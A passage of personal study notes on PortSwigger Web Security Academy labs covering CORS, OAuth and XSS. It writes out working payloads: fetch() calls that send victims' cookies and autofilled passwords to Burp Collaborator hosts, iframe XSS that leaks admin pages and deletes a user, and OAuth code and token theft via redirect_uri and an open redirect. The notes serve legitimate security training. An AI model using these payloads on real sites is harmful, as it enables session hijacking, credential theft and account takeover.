                    		xss_vector='"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML) ">';
                    		login_path='/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
                    		location=url+login_path;
                    	} catch(err){
                
                    	}
                    })
                    </script>
                  </body>
                </html>
                ```
                
        - Step 4 : Use XSS vulnerability to delete the Carlos user.
            - use the code obtained in the previous step, we find that there is indeed a form for deleting users with a csrf token
            - so what we do is access the form with javascript, change the value of the username field in the form and submit it (accessing the form with an xss, meaning no CORS restrictions, makes us able to access CSRF token)
            - Code
                
                ```jsx
                <html>
                  <body>
                    <script>
                    collaboratorURL="http://ds9ogc1nb3fj800ffy0co0bhq8wzko.burpcollaborator.net"
                    url="http://192.168.0.11:8080"
                
                  	fetch(url)
                    .then(response => response.text())
                    .then(text =>{
                    	try{
                    		xss_vector='"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0]; if(f.username)f.username.value=\'carlos\',f.submit() ">';
                    		login_path='/login?username='+encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
                    		location=url+login_path;
                    	} catch(err){
                
                    	}
                    })
                    </script>
                  </body>
                </html>
                ```
                
            - the use of the coma
                - from what i understood, if u use comma to separate instructions in an if, they will only work if the if statement is true
                - while a semicolon has the same usual use of separating instructions
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2052.png)
                
                @Ayman no, the comma is to ensure the command runs within the if statement. If you were to replace it with a semi colon the "f.submit()" line of code will run regardless of whether the if statement evaluated to true or not
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2053.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2054.png)
                
    - Methodology
        1. Change the origin header to an arbitrary value
        2. Change the origin header to the null value
        3. Change the origin header to one that begins with the origin of the site.
        4. Change the origin header to one that ends with the origin of the site.
- Oauth
    - Lab: Authentication bypass via OAuth implicit flow
        
        to understand, read “Improper implementation of the implicit grant type” 
        
        after clicking on confirm, we get : 
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2055.png)
        
        Reminder : the data after # are not sent to the backend (of the client app), only to the browser.
        
        if u read “GET /oauth-callback” u ll see that a js script grabs the token from the callback url (the one from the pic above, since they are using implicit grant type) and associate it with user information that you get from  “/me” in the oauth domain.
        
        the problem is the following script  dosent checking they are  information of the same user because the  server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted :
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2056.png)
        
         solution is use a valid token and change user information : 
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2057.png)
        
        and we replace the token generate by the “/authenticate” endpoint
        
    - Flawed CSRF protection
        
        the idea is here is that there is to show the importance of the Oauth component “state” which is a CSRF parameter.
        
        when attaching a social media profile to an account using Oauth the following endpoint is used (basically the callback step in the Authorization code grant type) :
        
        `/oauth-linking?code=KXgxU-h-hVEJIU9ED1qqKcn4XCh-BW8huBpEM8-MetK`
        
        there is no state parameter so we can use a CSRF attack
        
        in this lab, the code can be used only once so i had to:
        
        1.  click on “attack a social media profile” (after login, dosent matter of u attached a profile before) and intercept the request 
        2. get a new code and drop the request 
        3. use a normal csrf payload, in this case it was GET so i simply used  :
            
            <img src=”https://clientapp/oauth-linking?code=KXgxU-h-hVEJIU9ED1qqKcn4XCh-BW8huBpEM8-MetK” /> 
            
        4. click on deliver exploit to victim
        5. log out from the app and click on “login with social media”
        6. delete the user carlos using the admin panel
        - another walk-through :
            
            [https://www.youtube.com/watch?v=pmitJBefjNE](https://www.youtube.com/watch?v=pmitJBefjNE)
            
        
    - OAuth account hijacking via redirect_uri
        
        read “Leaking authorization codes and access tokens”
        
        it’s an Authorization code grant type
        
        we intercept the requests sent in the authentication process :
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2058.png)
        
        we get the link used by the app to do Oauth and we change the value of ‘redirect_uri” in order to forge the following exploit which we will host in the exploit server  : 
        
        `<img src=’[https://oauth-ac5c1f3d1fc674bac01008c1022e009c.web-security-academy.net/auth?client_id=hjn49yz4atg0e4mfzltsw&redirect_uri=https://exploit-ac991f181f2e748ac05d0850018500d0.web-security-academy.net/oauth-callback&response_type=code&scope=openid profile email](https://oauth-ac5c1f3d1fc674bac01008c1022e009c.web-security-academy.net/auth?client_id=hjn49yz4atg0e4mfzltsw&redirect_uri=https://exploit-ac991f181f2e748ac05d0850018500d0.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email)' />`
        
        or use an iframe like they did in the solution : 
        
        ```xml
        <iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
        ```
        
        admin opens link, performs the authentication, so we get the following code : 
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2059.png)
        
        so we go to the browser and access
        
        ```xml
        https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
        ```
        
        we access admin panel and we delete carlos
        
    - Stealing OAuth access tokens via an open redirect
        - we notice that u can change return_uri u can only add stuff after it, if that endpoint isnt there, it gives "400 Bad request", so we must find smt like a path traversal which is the case using a simple dot dot slash, we can confirm that with the following url :
        
        `/auth?client_id=kbdhprixrxvnw08ncxzwy&redirect_uri=https://ac9a1f171fa91eeec0695b5100d20010.web-security-academy.net/oauth-callback/../../post?postId=6&response_type=token&nonce=-366145326&scope=openid%20profile%20email`
        
        - like asked in the lab we need to find an open redirection in the blog, we find that on the “next post” feature, the redirection is in the following url :
        
        [`https://ac9a1f171fa91eeec0695b5100d20010.web-security-academy.net/../../post/next?path=https://exploit-acdb1fb81f831e57c0ba5b5b01d30000.web-security-academy.net`](https://ac9a1f171fa91eeec0695b5100d20010.web-security-academy.net/post/next?path=https://exploit-acdb1fb81f831e57c0ba5b5b01d30000.web-security-academy.net)
        
        - since this is oauth implicit flow, we will get a url like app#code
        - Thereby, our exploit should parse that, using the hash function :
        
        location.hash or url.hash : Sets or returns the anchor part (#) of a URL
        [https://app.com#blabla](https://app.com/#blabla) => # blabla
        
        location.hash.substring(1) : does a substring based on # and returns the second part (which is 1 since we start counting from 0)
        
        Reminder :  If the url starts with a / the current origin is added automatically 
        
        - thereby if we try accesing the following url , we will get the token of the wiener user:
        
        [https://oauth-ac521fa41f351e2cc08a5b1d02050094.web-security-academy.net/auth?client_id=kbdhprixrxvnw08ncxzwy&redirect_uri=https://ac9a1f171fa91eeec0695b5100d20010.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-acdb1fb81f831e57c0ba5b5b01d30000.web-security-academy.net/exploit&response_type=token&nonce=-294680111&scope=openid profile emai](https://oauth-ac521fa41f351e2cc08a5b1d02050094.web-security-academy.net/auth?client_id=kbdhprixrxvnw08ncxzwy&redirect_uri=https://ac9a1f171fa91eeec0695b5100d20010.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-acdb1fb81f831e57c0ba5b5b01d30000.web-security-academy.net/exploit&response_type=token&nonce=-294680111&scope=openid%20profile%20email)l
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2060.png)
        
        we accessed the url ourselves, but the admin can only access /exploit  (which can only parse the token for the moment)
        
        so we need to modify our exploit to include the case where we want to trigger an Outh authentication using an url that looks like the one above.
        
        - Reminder 2 : an empty string is equivalent to false when converted to Boolean in the “if” conditional Statements
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2061.png)
            
        
         so we use the following code  : 
        
        ```jsx
        <script>
        if(!document.location.hash){
        	window.location="https://oauth-ac521fa41f351e2cc08a5b1d02050094.web-security-academy.net/auth?client_id=kbdhprixrxvnw08ncxzwy&redirect_uri=https://ac9a1f171fa91eeec0695b5100d20010.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-acdb1fb81f831e57c0ba5b5b01d30000.web-security-academy.net/exploit&response_type=token&nonce=-294680111&scope=openid%20profile%20email"
        } else {
        window.location="/?"+window.location.hash.substring(1)
        }
        </script>
        ```
        
        we get the admin token : 
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2062.png)
        
        - the callback endpoint in the client app looks like this :
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2063.png)
            
        - we will use simply use the bearer token to get the API key from the “/me” endpoint and use to validate
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2064.png)
            
        
- XSS
    - fetch api ressources
        
        [Utiliser Fetch - Référence Web API | MDN](https://developer.mozilla.org/fr/docs/Web/API/Fetch_API/Using_Fetch)
        
        [GlobalFetch.fetch() - Référence Web API | MDN](https://developer.mozilla.org/fr/docs/Web/API/fetch)
        
        - La méthode `fetch()` est contrôlée par la directive `connect-src` de l'entête [Content Security Policy](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Content-Security-Policy) plutôt que par la directive de la ressource qui est récupérée.
        - JavaScript Promises
            
            [JavaScript Promise in 100 Seconds](https://www.youtube.com/watch?v=RvYYCGs45L4)
            
            [16.11: Promises Part 1 - Topics of JavaScript/ES6](https://www.youtube.com/watch?v=QO4NXhWo_NM)
            
            [16.12: Promises Part 2 - Topics of JavaScript/ES6](https://www.youtube.com/watch?v=AwyoVjVXnLk&t=0s)
            
            [JavaScript Promises In 10 Minutes](https://www.youtube.com/watch?v=DHvZLI7Db8E)
            
        - fetch tutorials
            
            [1.1: fetch() - Working With Data & APIs in JavaScript](https://www.youtube.com/watch?v=tc8DU14qX6I)
            
            [2.3 HTTP Post Request with fetch() - Working with Data and APIs in JavaScript](https://www.youtube.com/watch?v=Kw5tC5nQMRY&t=312s)
            
    - Stored XSS into HTML context with nothing encoded
        - u simply inject in the comment section
        - when u pentest an app, u should inject in inputs that get reflected in the page
        - try to GET the page and see if your alert got sanitized (and how) or not
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2065.png)
            
    - Stored XSS into anchor `href` attribute with double quotes HTML-encoded
        - we identify each input that gets reflected (in this case 3 : name, comment, website)
        - we find that the content of name and comment gets url-encoded
        - while there is no filtering when we inject in website, so we solve the challenge by using the following payloads :
            - `javascript:alert('Hello World!');`   in order to have `<a id="author" href="[https://](https://test4.ca/)fb.com" onmouseover="alert(1)">`
            - [`https://](https://test4.ca/)fb.com" onmouseover="alert(1)`   in order to have ``<a id="author" href="javascript:alert(1)">``
    - Exploiting cross-site scripting to steal cookies
        - lab link
            
            [Lab: Exploiting cross-site scripting to steal cookies | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
            
        - Most apps wont accept using http in POST requests so use **https in** Burp Colloborator or burp exploit server !!!!!
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2066.png)
            
        - post a comment having the malicious code
        - steal cookies with fetch using GET method (easiest one)
            
            `<script>fetch('[https://collaborator_subdomain/server.php?cookie='+document.cookie](http://127.0.0.1:8000/server.php?cookie=%27+document.cookie))</script>`
            
        - steal cookies with fetch using POST method ( recommended code )
            
            ```
            <script>
            fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
            method: 'POST',
            mode: 'no-cors',
            body:document.cookie
            });
            </script>
            ```
            
        - same thing but in one liner and a POST request (Rana code)
            
            <script>
            fetch('[https://pa3x8qffwid58856ijose41cn3tthi.oastify.com](https://pa3x8qffwid58856ijose41cn3tthi.oastify.com/)', {method: 'POST', mode: 'no-cors', body:document.cookie});
            </script>
            
        - mode: 'no-cors’
            - no-cors means don't allow the js code li dar l appel to access the response
            - it’s the value of this header
                
                [Request.mode - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Request/mode)
                
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2067.png)
            
        - Rest of the steps
            - victim user will be accessing the page after post, u will see his cookies in a request and probably also your cookies in another request, so obviously choose the request with the different cookies
            - use cookie editor in firefox and access login page
            - or use burp : Intercept trafic, replace cookies and Access `/my-account` and voila !
    - Exploiting cross-site scripting to capture passwords
        - mehdi notes
            - ila 3ndk multiple accounts ghaytsnak tkhtar an email or something, depending on the password manager, this is the behaviour of chrome password manager
            - 7ta kay w9e3 rendering dyal la page 3ad l password manager kaykhchi l values programmatically f7al kifma kidir selenium (true, cuz when i try with gmail i notice that the password gets filled after page load )
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2068.png)
            
        - prevent autofilling
            
            [How to turn off form autocompletion - Web security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2069.png)
            
        - Solution (same as platform)
            - insert a form in the comments so that when the victim will see it, the value of this form will get filled automatically after load (since the victim uses a password manager)
            - then, we will grab the new values of this parameters with JS and send creds with fetch
            - Code
                
                `<input name=username id=username>
                <input type=password name=password onchange="if(this.value.length)fetch('[https://9fpn15b5q68q6twbp8eobw2ay14rsg.burpcollaborator.net](https://9fpn15b5q68q6twbp8eobw2ay14rsg.burpcollaborator.net/)',{
                method:'POST',
                mode: 'no-cors',
                body:username.value+':'+this.value
                });">`
                
            - NB : we added an id in the username line in order to get the username DOM object easily, then get its value (which is a property of the object )
            - Result collaborator
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2070.png)
                
            - lab link
                
                [Lab: Exploiting cross-site scripting to capture passwords | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
                
    - Exploiting XSS to perform CSRF
        - my code using iframe
            
            `<iframe src=/my-account onload="var f=this.contentWindow.document.forms[0]; if(f.email)f.email.value='a@a.com',f.submit()" >`
            
        - plateform code using XHR
            - regex to get token
                
                `“()”`  specifies a group inside quotes
                
                `\w+` matches words 
                
                - since this regex has two maches (look at match information in pic) we gotta grab the second match in the code
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2071.png)
                
            - code
                - in the documentation below, we see that it’s possible to have a similar code with onload
                    - lase9 in this link :
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2072.png)
                    
                    [XMLHttpRequestEventTarget.onload - Référence Web API | MDN](https://developer.mozilla.org/fr/docs/Web/API/XMLHttpRequest/load_event)
                    
                    - esidate : onload is not defined but if its, it’s called when the event is triggered
                    - example of the use of onload (from XHR resources below)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2073.png)
                    
                
                ```
                <script>
                var req = new XMLHttpRequest();
                req.onload = handleResponse;
                req.open('get','/my-account',true);
                req.send();
                function handleResponse() {
                    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                    var changeReq = new XMLHttpRequest();
                    changeReq.open('post', '/my-account/change-email', true);
                    changeReq.send('csrf='+token+'&email=test@test.com')
                };
                </script>
                ```
                
            - XHR ressources
                
                [XML HttpRequest](https://www.w3schools.com/xml/xml_http.asp)
                
                [XML DOM - HttpRequest object](https://www.w3schools.com/xml/dom_httprequest.asp)
                
                [https://xhr.spec.whatwg.org/#the-response-attribute](https://xhr.spec.whatwg.org/#the-response-attribute)
                
    - Reflected XSS into attribute with angle brackets HTML-encoded
        - lab link
            
            [Lab: Reflected XSS into attribute with angle brackets HTML-encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
            
        - inspect element didn’t show that the angle brackets were html encoded so it’s not reliable to use
        - when they don’t give you an exploit server, they ask you to trigger an alert or a print() so it doesn’t have to be realistic where u send a malicious link to the victim, it could be a simple self xss with almost no risk
        - if we use a classic payload and look at the source code after submit, we find that the brackets got html encoded, but the good thing is that our inout gets placed in the value of the value attribute of the input element
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2074.png)
            
        - so we use the payload `"onmouseover="alert(1)`  to trigger an xss when we move the mouse over that input
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2075.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2076.png)
            
    - Reflected XSS into a JavaScript string with angle brackets HTML encoded
        - if we inject a random string, we can see that it gets placed here
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2077.png)
            
        - since we’re already inside the `<script>` tags, we use a payload like `';alert();//` to trigger an alert
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2078.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2079.png)
            
        - 
        
    - Reflected XSS into HTML context with most tags and attributes blocked
        - detailled steps in portswigger lab link
            
            [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
            
        - since many tags get blocked, we use intruder to check if there is a tag and an event which don’t get blocked using Portswigger Cheatsheet
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2080.png)
            
        - find tag
            
            we use intruder and this as a value `<$$>` 
            
            `<body>` doesn’t get blocked 
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2081.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2082.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2083.png)
            
        - finding event(s)
            - Again, we use intruder with the following value  `<body $$=1 >` url-encoded, so it becomes
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2084.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2085.png)
            
        - found 3 events but the only one which didn’t require user interaction ( like asked in the lab description) was `onresize`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2086.png)
            
        - Howerver, this only triggers when u resize the window and we should send the exploit to the victim without user interaction
        - solution is to use an iframe that gets resized after loading and have the vulnerable app as src
            
            ```html
            <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
            ```
            
    - Reflected XSS into HTML context with all tags blocked except custom ones
        - using Portswigger xss cheatsheet, we find several events that do not require user interaction
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2087.png)
            
        - but they still require us to trigger them automatically
        - we’ll use the `onfocus` event, and focus on the element using the hash `#` followed by the id of the element
            
            `<xss id=yo onfocus=alert(document.cookie) tabindex=1>` and focus on this element with `#yo`
            
            - This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert`
             function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert`
             payload to be called.
            
            ```
            <script>
                location = 'https://0a9000790472d004c0613d92000c004f.web-security-academy.net/?search=%3Cxss+id%3Dyo+onfocus%3Dalert(document.cookie)+tabindex%3D1%3E#yo';
                </script>
            ```
            
    - Reflected XSS with some SVG markup allowed
        - lab link and solution
            
            [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
            
        - some SVG markup allowed doesn’t mean there must be only the the `<svg>` tag !
        - we take the normal approach of using intruder and portswigger xss cheatsheet
        - finding allowed tags
            - in the cheatsheet, make sure that u click twice to select “All tags” before u press “Copy tags to clipboard” (otherwise not all the tags will be copied and the results of intruder will be false)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2088.png)
                
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2089.png)
            
        - since we have `<svg>` in the lab title, i looked into events that work with the `<svg>` tag, found `onbegin` is allowed but no xss payload in the cheatsheet uses both `<svg>` and `onbegin`
        - at this stage, there is 2 approaches :
            - Mine, the lazy approach
                - Since we have <svg> in the lab title and many allowed tags, i looked in the cheatsheet for payloads that brings 2 of these tags,
                - while searching in the cheatsheet, i looked by :
                    - choosing SVG tag and using the other found tags with CRTL+f
                    - noticing that tags `svg` and `animatetransorm` are both included in one of the tags of the list (look at image below), so we chose that tags and look at the results
                - Got few results, the first one worked
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2090.png)
                
            - second approach (useful if there is no hints in the title)
                - if there is no easy route, u just have to check events of each tags and try to trigger xss with it.
                    - finding allowed events
                        - `onbegin` is allowed on svg and `animatetransform`
                            
                            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2091.png)
                            
                        - it’s important to notice that u can only access `animatetransform` by selecting `svg > animatetransform` in the dropdown list
                            
                            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2092.png)
                            
                        - we find no payloads in the cheatsheet with `<svg>` and `onbegin`, while we found one with `animatetransform` and `onbegin`
                            
                            ```html
                            <svg><animatetransform onbegin=alert(1) attributeName=transform>
                            ```
                            
                            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2093.png)
                            
    - Reflected XSS in canonical link tag
        - when they tell you that there is an XSS in the homepage and u see no user input inside the page then the only possible input is in the url `?aaaaaa`
        - we notice that url user input get reflected in the link element
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2094.png)
            
        - if we look for a payload using the link element, that requires the press of CRTL…. and only works in chrome, we ll find :
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2095.png)
            
        - so we use the following payload
            
            ```html
            https://0aae009203af958fc01f24a2004100e7.web-security-academy.net/?'accesskey='x'onclick='alert(1)
            ```
            
            - This sets the `X` key as an access key for the whole page. When a user presses the access key, the `alert` function is called.
        - still didn’t figure out why it only works when there is no space between attributes, when i ass a space i can’t trigger the pop up for some reason
    - Reflected XSS into a JavaScript string with single quote and backslash escaped
        - lab link and solution
            
            [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
            
        - to confirm what’s in the title of the video, single quote and backslash  are escaped
            - if we insert `aa’bb` we ‘ll get :
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2096.png)
            
        - Important reminders
            - in JS backslash can be use to escape a single or double quote, that means any single quote inside is considered part of the string
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2097.png)
                
            - if u close the `<script>` tag, the JS has ended even if there is an open single quote, so if open a new `script` tag it will be interpreted independently.
                
                In other words, the followings html code triggers a pop up
                
                ```html
                <script>var searchTerms = '</script><script>alert(1)</script>
                ```
                
        - Since angle brackets are not escaped, we can simply close the `<script>` and open a new one to trigger a pop up inside it
            - using the payload `</script><script>alert(1)</script>` we solve the lab
            - this will give the following result :
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2098.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%2099.png)
            
    - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
        - we have single quotes escaped from the title
        - when we test, we find that anti slash  `\` isn’t escaped
            
            if we insert `a\b` it stays the same
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20100.png)
            
        - Reminder : in JS escaping works by using anti slash before the special character so that it becomes part of the string, and anti slash itself is part of these characters
        - Thus, we can solve the lab by using the following payload `\';alert();//`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20101.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20102.png)
            
    - Reflected Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
        - if we insert a normal comment, we notice that the url of the comment is being used in an onclick event
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20103.png)
            
        - didn’t find yet the documentation of the `track()` function
        - apparently there is  html decoding by default for some reason
        - since we’re stuck in single quotes, we use the html encoding form for a single quote to forge the payload that will trigger                 a pop up
        - using the payload [`https://webapp](https://webapp/)');alert();//` in the website input we solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20104.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20105.png)
            
        - if we click on the comment name we see the pop up
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20106.png)
            
    - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
        - A template literal use back-ticks (``) to define a string.
        - user input is reflected in a template literal
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20107.png)
            
        - like said in the lab title, we can’t use any of those characters to escape the backticks.
        - check Expression Substitution in the following page
            - Template literals provide an easy way to interpolate variables and expressions into strings.The method is called string interpolation.
            
            [https://www.w3schools.com/js/js_string_templates.asp](https://www.w3schools.com/js/js_string_templates.asp)
            
            - 
        - Basically, we can use a JS expression with `${...}` inside a template literal.
        - So, we can simply trigger a pop up by using the payload `${alert(1)}`
        - do not use semi comma in your js
            
            `${alert(1);}` do not work 
            
    - DOM based
        - Reminders
            - DOM Documentation
                
                [Document Object Model (DOM) - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model)
                
            - DOM tutorial links
                
                [What is DOM-based XSS (cross-site scripting)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based)
                
                [What is DOM | Document Object Model | Beginner Tutorial](https://www.youtube.com/watch?v=ipkjfvl40s0)
                
                [The Document Object Model (DOM) - A Complete Beginners Guide](https://www.youtube.com/watch?v=ii8xGK6mrPg)
                
                [https://materials.rangeforce.com/tutorial/2020/01/19/DOM-based-XSS/](https://materials.rangeforce.com/tutorial/2020/01/19/DOM-based-XSS/)
                
            - DOM
                - it’s an interface to use html in
                - it’s like an API to interact with an html document in order to use it dynamically, add/modify/delete stuff in static html
                - it’s useful for having a good user experience since u can modify the DOM if an event happens ...
                - An API can taught of as a user manual to use a third party software  or hardware without having to know how it works (just like his definition)
                - it connects javascript to html
                - it’s not programming language or part of javascript ( i guess when we use the console it’s still JS but the objects that helps interacting with html belong to the DOM api like the Element class and the Node interface and their properties and methods)
                - it exists only in the browser and different browsers have slightly different implementations of the DOM, that’s why we usually “MDN web docs” as documentation
                - That’s also why the url, the local storage, the tabs, the browser width and height, the referer, how much we can scroll,  are  all part of the DOM
                - check this example :
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20108.png)
                
                the DOM tree is constructed by a bunch of nodes
                
                u can get the type of a node by looking for the `nodeType`  property which return an integer
                
                for each type, we can find the methods, properties and event listeners in the documentation
                
                everything in the DOM inherits from the Node interface (basic POO) which means they inherit its properties and methods
                
                [Node - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Node/)
                
            
            `window.location` returns url
            
            when we use only `location` we’re using the `location` property of the `window`
            
            `[location.search](http://location.search)` returns ?a=b
            
            - L'élément HTML **`<a>`**(*anchor* en anglais), avec [son attribut `href`](https://developer.mozilla.org/fr/docs/Web/HTML/Element/a#href) crée un lien hypertexte vers des pages web
                
                <a href="[https://example.com](https://example.com/)">Website</a>
                
                [: l'élément d'ancre - HTML (HyperText Markup Language) | MDN](https://developer.mozilla.org/fr/docs/Web/HTML/Element/a)
                
            
            The anchor portion of the URL is the part after #
            
            - The `location.hash` property sets or returns the anchor part of a URL, including the hash sign (#).
                
